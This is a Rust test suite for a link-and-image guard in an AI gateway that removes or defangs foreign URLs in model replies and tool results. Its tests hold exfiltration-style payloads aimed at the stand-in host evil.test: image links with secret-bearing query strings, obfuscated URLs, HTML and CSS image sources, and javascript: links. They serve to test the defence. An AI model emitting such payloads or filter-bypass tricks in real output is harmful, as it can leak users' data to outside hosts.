// SPDX-FileCopyrightText: 2026 ai-gw contributors
// SPDX-License-Identifier: AGPL-3.0-or-later

#![allow(clippy::unwrap_used, clippy::panic)]

use aigw_core::ir::{
    ChatRequest, ChatResponse, Choice, Message, Part, Role, StopReason, StreamEvent,
};
use aigw_core::wire::WireFormat;
use http::HeaderMap;
use serde_json::json;

use super::*;
use crate::chain::{Chain, ChunkMode, ChunkRunner, Entry};
use crate::plugin::{Meta, ResponseHeaders};

fn guard(cfg: Value) -> Arc<LinkGuard> {
    Arc::new(LinkGuard::from_config(serde_json::from_value(cfg).unwrap()).unwrap())
}

fn info() -> CallInfo {
    CallInfo::new("req-1", WireFormat::OpenAiChat)
}

/// Ergebnis von `process` als Text.
fn run(g: &LinkGuard, text: &str) -> String {
    g.process(text, false, &info())
        .unwrap()
        .unwrap_or_else(|| text.to_owned())
}

fn hits(info: &CallInfo) -> Vec<(String, &'static str, u32)> {
    let mut v: Vec<_> = info
        .guardrails
        .snapshot()
        .into_iter()
        .map(|h| (h.category, h.action, h.count))
        .collect();
    v.sort();
    v
}

#[test]
fn config_validation() {
    let f = Factory;
    assert!(f.build(&json!({})).is_ok());
    assert!(
        f.build(
            &json!({"allowDomains": ["example.com", "*.example.org", "Docs.Acme.example."],
                        "images": "allow", "links": "block", "action": "defang",
                        "blockQueryParams": true, "maxPathLength": 64,
                        "direction": "both", "roles": ["tool", "user"],
                        "streamMaxHoldBytes": 1024})
        )
        .is_ok()
    );
    for bad in [
        json!({"allowDomains": ["*"]}),
        json!({"allowDomains": ["https://example.com"]}),
        json!({"allowDomains": ["exa mple.com"]}),
        json!({"allowDomains": ["*.*.example.com"]}),
        json!({"images": "maybe"}),
        json!({"action": "explode"}),
        json!({"maxPathLength": 0}),
        json!({"streamMaxHoldBytes": 10}),
        json!({"roles": []}),
        json!({"bogus": 1}),
    ] {
        assert!(f.build(&bad).is_err(), "{bad}");
    }
}

#[test]
fn default_strips_foreign_images_only() {
    let g = guard(json!({"allowDomains": ["example.com", "*.cdn.example.net"]}));
    assert_eq!(
        run(&g, "A ![x](https://evil.test/p.png?d=geheim) B"),
        "A  B"
    );
    // Erlaubte Domains, Subdomain-Wildcard (nicht die Domain selbst), relative Ziele.
    for ok in [
        "![x](https://example.com/a.png)",
        "![x](https://img.cdn.example.net/a.png)",
        "![x](/static/a.png)",
        "![x](data:image/png;base64,AAAA)",
        "[Doku](https://evil.test/docs?x=1)",
        "Siehe https://evil.test/a?b=c",
    ] {
        assert_eq!(run(&g, ok), ok, "{ok}");
    }
    assert_eq!(run(&g, "![x](https://cdn.example.net/a.png)"), "");
    assert_eq!(run(&g, "![x](https://example.com.evil.test/a.png)"), "");
}

#[test]
fn links_queries_and_paths() {
    let g = guard(json!({"links": "block", "allowDomains": ["example.com"]}));
    assert_eq!(
        run(
            &g,
            "Mehr [hier](https://evil.test/x \"T\") und [da](https://example.com)."
        ),
        "Mehr hier und [da](https://example.com)."
    );
    assert_eq!(
        run(&g, "Siehe https://evil.test/a, bitte."),
        "Siehe , bitte."
    );
    assert_eq!(run(&g, "oder www.evil.test/x"), "oder ");
    let g = guard(json!({"blockQueryParams": true, "maxPathLength": 20}));
    assert_eq!(
        run(&g, "[a](https://evil.test/x)"),
        "[a](https://evil.test/x)"
    );
    assert_eq!(run(&g, "[a](https://evil.test/x?d=1)"), "a");
    assert_eq!(run(&g, "[a](https://user:pw@evil.test/x)"), "a");
    assert_eq!(
        run(&g, "[a](https://evil.test/aaaaaaaaaaaaaaaaaaaaaaaaa)"),
        "a"
    );
}

#[test]
fn reference_definitions_and_nesting() {
    let g = guard(json!({}));
    let text = "Bild: ![logo][l]\n\n[l]: https://evil.test/p.png?d=1 \"t\"\nEnde";
    assert_eq!(run(&g, text), "Bild: ![logo][l]\n\n\nEnde");
    // Bild im Linktext, beide fremd: Bild weg, Link bleibt (Links erlaubt).
    assert_eq!(
        run(&g, "[![b](https://evil.test/i.png)](https://evil.test/x)"),
        "[](https://evil.test/x)"
    );
    // Ziel mit Klammern.
    assert_eq!(run(&g, "![w](https://evil.test/wiki/A_(b)) Rest"), " Rest");
    assert_eq!(run(&g, "![w](<https://evil.test/a b.png>)"), "");
}

#[test]
fn html_tags() {
    let g = guard(json!({"links": "block", "allowDomains": ["example.com"]}));
    assert_eq!(run(&g, "a<img src=\"https://evil.test/p\">b"), "ab");
    assert_eq!(run(&g, "a<IMG alt='x>y' SRC=https://evil.test/p>b"), "ab");
    assert_eq!(
        run(
            &g,
            "<a href=\"https://evil.test\">Klick</a> <a href=\"https://example.com\">ok</a>"
        ),
        "Klick</a> <a href=\"https://example.com\">ok</a>"
    );
    assert_eq!(
        run(&g, "<img srcset=\"/a.png 1x, https://evil.test/b.png 2x\">"),
        ""
    );
    assert_eq!(
        run(
            &g,
            "<div style=\"background:url('https://evil.test/x')\">t</div>"
        ),
        "t</div>"
    );
    // Entities im Attribut.
    assert_eq!(run(&g, "<img src=\"https&#58;//evil.test/p\">"), "");
    // Kein Tag (Leerzeile) bzw. Vergleich.
    assert_eq!(run(&g, "a <b\n\nc"), "a <b\n\nc");
    assert_eq!(run(&g, "1 < 2 > 0"), "1 < 2 > 0");
}

#[test]
fn tricky_urls() {
    let g = guard(json!({"allowDomains": ["example.com"]}));
    for evil in [
        "![x](https://example.com@evil.test/p.png)",
        "![x](https://evil.test\\@example.com/p.png)",
        "![x](//evil.test/p.png)",
        "![x](HTTPS://EVIL.TEST/p.png)",
        "![x](https:/\\evil.test/p.png)",
        "![x](https://%65vil.test/p.png)",
        "![x](https://evil。test/p.png)",
        "![x](https:evil.test/p.png)",
        "![x](ftp://evil.test/p.png)",
    ] {
        assert_eq!(run(&g, evil), "", "{evil}");
    }
    assert_eq!(
        run(&g, "![x](https://EXAMPLE.com.:443/p.png)"),
        "![x](https://EXAMPLE.com.:443/p.png)"
    );
    // javascript: immer verboten, auch bei erlaubten Links.
    assert_eq!(run(&g, "[x](javascript:alert(1))"), "x");
    assert_eq!(run(&g, "[x](JaVa&#x09;Script:alert(1))"), "x");
}

#[test]
fn defang_reject_flag() {
    let g = guard(json!({"action": "defang", "links": "block"}));
    assert_eq!(
        run(
            &g,
            "![x](https://evil.test/p.png) [t](https://a.evil.test/x) https://b.test/y"
        ),
        "[blocked image: evil[.]test] t [blocked link: a[.]evil[.]test] [blocked link: b[.]test]"
    );
    let g = guard(json!({"action": "reject"}));
    let i = info();
    assert_eq!(
        g.process("ok ![x](https://evil.test/p.png)", false, &i),
        Err("image")
    );
    assert_eq!(hits(&i), [("image".to_owned(), "reject", 1)]);
    let g = guard(json!({"action": "flag", "links": "block"}));
    let i = info();
    let text = "![x](https://evil.test/p.png) und [l](https://evil.test)";
    assert_eq!(g.process(text, false, &i), Ok(None));
    assert_eq!(
        hits(&i),
        [
            ("image".to_owned(), "flag", 1),
            ("link".to_owned(), "flag", 1)
        ]
    );
}

#[test]
fn removal_cannot_form_new_constructs() {
    let g = guard(json!({}));
    // Entfernen des inneren Tags würde `<img src=…>` bilden.
    let out = run(
        &g,
        "<im<img src=https://evil.test/a>g src=https://evil.test/b>",
    );
    assert!(!out.contains("<img"), "{out}");
    // `!` + entferntes Tag + Link → würde ein Bild.
    let out = run(&g, "!<img src=https://evil.test/a>[x](https://evil.test/b)");
    assert_eq!(out, "");
}

// ---------------------------------------------------------------------------------------------
// Stream
// ---------------------------------------------------------------------------------------------

fn stream(g: Arc<LinkGuard>, info: CallInfo, events: Vec<StreamEvent>) -> Vec<StreamEvent> {
    let chain = Arc::new(Chain::new(vec![Arc::new(Entry::new(NAME, g))]));
    let mut r = ChunkRunner::new(chain, Arc::new(info), Meta::new(), ChunkMode::Live);
    let mut out = Vec::new();
    for ev in events {
        r.push(ev, &mut out);
    }
    r.finish(&mut out);
    out
}

fn pieces(text: &str, size: usize) -> Vec<StreamEvent> {
    let mut v = vec![StreamEvent::Start {
        id: "s".into(),
        model: "m".into(),
        created: None,
    }];
    let mut rest = text;
    while !rest.is_empty() {
        let mut n = rest.len().min(size);
        while !rest.is_char_boundary(n) {
            n += 1;
        }
        v.push(StreamEvent::TextDelta {
            index: 0,
            text: rest[..n].to_owned(),
        });
        rest = &rest[n..];
    }
    v.push(StreamEvent::Stop {
        reason: StopReason::EndTurn,
        stop_sequence: None,
    });
    v
}

fn joined(evs: &[StreamEvent]) -> String {
    evs.iter()
        .filter_map(|e| match e {
            StreamEvent::TextDelta { text, .. } => Some(text.as_str()),
            _ => None,
        })
        .collect()
}

const STREAM_TEXTS: &[&str] = &[
    "Hallo ![x](https://evil.test/p.png?d=geheim) Welt [ok](https://example.com/x) Ende.",
    "Siehe <img alt=\"a b\" src=\"https://evil.test/p\"> und ![y](https://example.com/y.png)!",
    "Liste:\n- [a](https://evil.test/a)\n- https://evil.test/b?c=d\n\n[r]: https://evil.test/r.png\n",
    "Größe ≤ 3 µm – ![ü](https://evil.test/ä.png) – fertig",
    "x [nicht geschlossen und weiter ohne Klammer. Danach ![b](https://evil.test/q)",
];

#[test]
fn stream_matches_whole_text_for_all_chunk_sizes() {
    let g = guard(json!({"allowDomains": ["example.com"], "links": "block"}));
    for text in STREAM_TEXTS {
        let whole = run(&g, text);
        assert!(!whole.contains("evil"), "{whole}");
        for size in 1..=7 {
            let out = stream(Arc::clone(&g), info(), pieces(text, size));
            let s = joined(&out);
            assert_eq!(s, whole, "Stückgröße {size}: {text}");
            assert!(matches!(out.last(), Some(StreamEvent::Stop { .. })));
        }
    }
}

#[test]
fn stream_never_leaks_partial_construct() {
    let g = guard(json!({}));
    let text = "Text ![a](https://evil.test/p.png?d=0123456789) weiter";
    let out = stream(Arc::clone(&g), info(), pieces(text, 3));
    // Kein einzelnes Ereignis enthält einen Teil der fremden URL.
    for e in &out {
        if let StreamEvent::TextDelta { text, .. } = e {
            assert!(!text.contains("evil") && !text.contains("](h"), "{text:?}");
        }
    }
    assert_eq!(joined(&out), "Text  weiter");
}

#[test]
fn stream_bang_before_removed_tag_cannot_form_image() {
    // Bilder blockiert, Links erlaubt: `!` + entferntes Tag in einem Stück, Link im nächsten.
    let g = guard(json!({}));
    let evs = vec![
        StreamEvent::TextDelta {
            index: 0,
            text: "!<img src=https://evil.test/a> ".into(),
        },
        StreamEvent::TextDelta {
            index: 0,
            text: "x".into(),
        },
    ];
    let out = stream(Arc::clone(&g), info(), evs);
    assert_eq!(joined(&out), "! x");
    let evs = vec![
        StreamEvent::TextDelta {
            index: 0,
            text: "!<img src=https://evil.test/a>".into(),
        },
        StreamEvent::TextDelta {
            index: 0,
            text: "[x](https://evil.test/b)".into(),
        },
    ];
    let out = stream(g, info(), evs);
    assert!(!joined(&out).contains("evil"), "{out:?}");
}

#[test]
fn stream_forced_flush_after_max_hold() {
    let g = guard(json!({"streamMaxHoldBytes": 256}));
    let long = "A".repeat(600);
    let text = format!("![x](https://evil.test/{long}) Ende");
    let out = stream(Arc::clone(&g), info(), pieces(&text, 50));
    let s = joined(&out);
    assert!(!s.contains("evil") && !s.contains("!["), "{s}");
    assert!(s.ends_with(") Ende"), "{s}");
    // Erlaubter langer Link kommt vollständig durch.
    let g = guard(json!({"streamMaxHoldBytes": 256, "allowDomains": ["example.com"]}));
    let text = format!("![x](https://example.com/{long}) Ende");
    let out = stream(g, info(), pieces(&text, 50));
    assert_eq!(joined(&out), text);
}

#[test]
fn stream_reject_ends_with_content_filter() {
    let g = guard(json!({"action": "reject"}));
    let out = stream(
        g,
        info(),
        pieces("Hallo ![x](https://evil.test/p.png) Welt", 4),
    );
    assert_eq!(
        out.last(),
        Some(&StreamEvent::Stop {
            reason: StopReason::ContentFilter,
            stop_sequence: None
        }),
        "{out:?}"
    );
    assert!(!joined(&out).contains("evil"));
}

#[test]
fn stream_passes_tool_calls_and_flushes_before() {
    let g = guard(json!({}));
    let evs = vec![
        StreamEvent::TextDelta {
            index: 0,
            text: "Suche ![x](https://evil.test".into(),
        },
        StreamEvent::ToolCallDelta {
            index: 1,
            arguments: "{\"url\":\"https://evil.test/x\"}".into(),
        },
    ];
    let out = stream(g, info(), evs);
    // Unvollständiges Bild am Blockende wird geprüft (bis zum Ende) und entfernt.
    assert_eq!(joined(&out), "Suche ");
    assert!(out.iter().any(
        |e| matches!(e, StreamEvent::ToolCallDelta { arguments, .. } if arguments.contains("evil"))
    ));
}

// ---------------------------------------------------------------------------------------------
// Anfrage und Antwort
// ---------------------------------------------------------------------------------------------

#[test]
fn response_and_tool_results() {
    let g = guard(json!({"direction": "both"}));
    let i = info();
    let resp = ChatResponse {
        id: "r".into(),
        model: "m".into(),
        created: None,
        choices: vec![Choice {
            index: 0,
            message: Message::text(Role::Assistant, "a ![x](https://evil.test/p.png) b"),
            stop_reason: Some(StopReason::EndTurn),
            stop_sequence: None,
            extra: Default::default(),
        }],
        usage: None,
        extra: Default::default(),
        source: None,
    };
    let mut meta = Meta::new();
    let mut rh = ResponseHeaders::default();
    let mut ctx = RespCtx {
        info: &i,
        response: resp,
        response_headers: &mut rh,
        meta: &mut meta,
    };
    let Hook::Ready(Ok(Flow::Continue)) = g.on_response(&mut ctx) else {
        panic!()
    };
    assert_eq!(ctx.response.choices[0].message.content.text(), "a  b");

    // Eingabe: Tool-Ergebnisse (OpenAI-Rolle `tool` und Anthropic-`tool_result`-Teil),
    // Nutzertext bleibt (Standard-Rollen: tool).
    let headers = HeaderMap::new();
    let mut ctx = ReqCtx {
        info: &i,
        request: ChatRequest {
            model: "m".into(),
            messages: vec![
                Message::text(Role::User, "![u](https://evil.test/u.png)"),
                Message::text(Role::Tool, "![t](https://evil.test/t.png)"),
                Message {
                    role: Role::User,
                    content: Content::Parts(vec![Part::new(PartKind::ToolResult {
                        tool_call_id: "c1".into(),
                        content: Content::Text("R ![r](https://evil.test/r.png)".into()),
                        is_error: None,
                    })]),
                    name: None,
                    extra: Default::default(),
                },
            ],
            ..ChatRequest::default()
        },
        client_headers: &headers,
        upstream_headers: HeaderMap::new(),
        response_headers: ResponseHeaders::default(),
        meta: Meta::new(),
    };
    let Hook::Ready(Ok(Flow::Continue)) = g.on_request(&mut ctx) else {
        panic!()
    };
    let m = &ctx.request.messages;
    assert_eq!(m[0].content.text(), "![u](https://evil.test/u.png)");
    assert_eq!(m[1].content.text(), "");
    let Content::Parts(p) = &m[2].content else {
        panic!()
    };
    let PartKind::ToolResult { content, .. } = &p[0].kind else {
        panic!()
    };
    assert_eq!(content.text(), "R ");
}

#[test]
fn phases_follow_direction() {
    assert_eq!(guard(json!({})).phases(), Phases::OUTPUT);
    assert_eq!(
        guard(json!({"direction": "input"})).phases(),
        Phases::REQUEST
    );
    assert_eq!(guard(json!({"direction": "both"})).phases(), Phases::ALL);
}
